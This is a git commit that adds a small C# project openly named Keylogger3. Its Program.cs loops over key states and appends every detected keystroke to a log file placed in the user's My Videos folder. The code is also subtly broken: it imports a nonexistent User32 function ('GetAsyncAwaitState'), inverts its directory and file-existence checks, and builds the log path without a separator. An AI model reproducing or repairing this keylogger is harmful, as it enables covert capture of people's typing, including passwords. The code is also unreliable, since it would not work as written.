70de57e2d47bdc354ae9b2b768eed6c508c10b69
Brandon <contact@brandonhunter.co.za>
2019-12-24 15:28:50 +0100

    Add project files.

---
+++ Keylogger3/Program.cs
@@ -0,0 +1,69 @@
+﻿using System;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Threading;
+using System.Windows.Forms;
+namespace Keylogger3
+{
+    static class Program
+    {
+        [DllImport("User32.dll")] // Import user dll
+        private static extern int GetAsyncAwaitState(int i);
+        static void Main(string[] args)
+        {
+            logs();
+            Console.ReadLine();
+        }
+
+
+
+        static void logs()
+        {
+            var filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos); // Your file path
+            filepath += @"\logsfolder"; // folder file
+
+            if (Directory.Exists(filepath))
+            {
+                Directory.CreateDirectory(filepath);
+
+                
+            }
+
+            var path = (@filepath + "logskey.text"); // Your file name
+            if (File.Exists(path))
+            {
+                using (var sw = File.CreateText(path))
+                {
+
+                }
+                 var converter = new KeysConverter();
+                 var text = "";
+
+                 while (5 > 1)
+                 {
+                     Thread.Sleep(5);
+                     for (var i = 0; i < 2000; i++)
+                     {
+                         var key = GetAsyncAwaitState(i);
+                         if(key == 1 || key == -32767)
+                         {
+                             text = converter.ConvertToString(i);
+
+                             using (var sw = File.AppendText(path))
+                             {
+                                 sw.WriteLine(text);
+                             }
+                             
+                             break;
+                         }
+                         
+                     }
+                 }
+            }
+        }
+    }
+}
---
+++ Keylogger3/Properties/AssemblyInfo.cs
@@ -0,0 +1,36 @@
+﻿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// General Information about an assembly is controlled through the following
+// set of attributes. Change these attribute values to modify the information
+// associated with an assembly.
+[assembly: AssemblyTitle("Keylogger3")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("Keylogger3")]
+[assembly: AssemblyCopyright("Copyright ©  2019")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Setting ComVisible to false makes the types in this assembly not visible
+// to COM components.  If you need to access a type in this assembly from
+// COM, set the ComVisible attribute to true on that type.
+[assembly: ComVisible(false)]
+
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+[assembly: Guid("b826e4aa-af09-480a-b237-0a3f7dbfbd87")]
+
+// Version information for an assembly consists of the following four values:
+//
+//      Major Version
+//      Minor Version
+//      Build Number
+//      Revision
+//
+// You can specify all the values or you can default the Build and Revision Numbers
+// by using the '*' as shown below:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
